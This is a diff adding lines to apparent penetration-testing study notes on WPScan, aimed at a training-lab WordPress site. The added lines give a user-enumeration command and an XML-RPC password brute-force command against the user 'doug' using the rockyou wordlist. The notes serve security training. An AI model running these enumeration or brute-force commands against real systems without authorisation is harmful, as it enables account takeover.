@@ -13,3 +13,17 @@ WPScan is also able to pull in vulnerability information from external sources. 
 ```shell-session
 sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
 ```
+
+
+We can use
+```
+wpscan --url http://blog.inlanefreight.local --enumerate u
+```
+to enumerate from users
+
+
+brute force
+
+```
+sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
